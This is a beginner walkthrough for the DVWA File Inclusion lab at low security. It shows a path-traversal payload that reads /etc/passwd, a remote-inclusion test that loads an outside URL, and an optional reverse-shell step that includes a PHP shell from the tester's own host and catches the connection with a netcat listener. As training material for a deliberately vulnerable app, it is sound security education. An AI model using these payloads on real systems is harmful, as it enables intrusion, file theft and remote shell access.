📂 File Inclusion – Low Security Level

### 🛠️ Objective:
Exploit Local File Inclusion (LFI) and Remote File Inclusion (RFI) by manipulating the `page` parameter in the URL.

---

### 🧭 Step-by-Step Walkthrough

1. On the File Inclusion page, you’ll see three links (files).
2. When clicking one, observe the URL:
```

[http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php](http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file1.php)

````

3. Replace the `page` parameter to point to a system file:
```bash
page=../../../../../etc/passwd
````

✅ The contents of `/etc/passwd` will be displayed, confirming **Local File Inclusion** (LFI).

---

### 🌐 Remote File Inclusion (RFI)

Try injecting a full URL:

```bash
page=https://www.google.com
```

✅ You’ll see Google’s homepage loaded, indicating **RFI is possible** at this level.

---

### 🐚 Reverse Shell via RFI (Optional)

1. Host a PHP shell file on your server (e.g., `shell.php`)
2. Use:

   ```bash
   page=http://<your-ip>/shell.php
   ```
3. On your terminal, run:

   ```bash
   nc -nlvp 4444
   ```

If the shell is executed, you’ll get a reverse connection.

---

### 🧩 Summary

* ✅ LFI and RFI both possible
* ❌ No input filtering or path restrictions
* 🟢 Perfect for demonstrating real-world risk

## ✅ Status

* ✅ Fully exploitable
* 🟢 Beginner-friendly
